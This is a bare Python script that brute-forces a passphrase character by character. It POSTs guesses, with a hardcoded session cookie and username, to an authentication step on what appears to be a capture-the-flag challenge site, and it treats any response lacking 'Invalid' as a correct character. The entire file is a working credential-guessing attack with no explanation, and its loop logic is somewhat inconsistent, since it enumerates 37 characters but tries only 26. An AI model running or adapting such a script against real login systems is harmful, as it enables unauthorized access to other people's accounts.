

import requests

URL = "http://www.challenges.com/authentication/auth3-step2.php?user=dXNlcjl="
 

enumeration = "abcdefghijklmnopqrstuvwxyz 1234567890"
start = 1
bless = 0

passphrase = "c"

for y in range(20):
	if start < y:
		for x in range(26):
			character = enumeration[bless:bless+1]
			PARAMS = {'char_1_value':character,'char_1_pos':start,'char_2_value':character,'char_2_pos':start,'username':'user2','PHPSESSID':'r6hjgn5pf6jjd9t0aiqrrm5m16','user':'dXNlcjl='}
			r = requests.post(url = URL, data = PARAMS)

			h = r.text
		 
			if "Invalid" in h:
				print("Tried character: " + str(character) + " at pos " + str(start))
				bless = bless + 1
			else:
				print("Success")
				start = start + 1
				bless = 0
				passphrase += str(character)
				print(passphrase)



